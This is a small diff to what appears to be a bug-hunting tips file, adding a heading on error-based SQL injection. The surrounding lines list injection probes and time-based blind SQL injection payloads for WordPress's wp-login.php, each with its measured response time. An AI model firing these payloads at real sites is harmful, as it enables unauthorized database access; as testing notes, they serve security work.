@@ -22,6 +22,8 @@
 
  #Tip 3:
  =======
+**Try Error Base SQL injection **
+
 	This is how to find sql-Injection of the time
 	/?q=1
 	/?q=1'
@@ -41,6 +43,7 @@
 	/?q=-x()
 
 **Try This Payload in Wp-login.php page**
+	
 	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
 	0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
 	0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
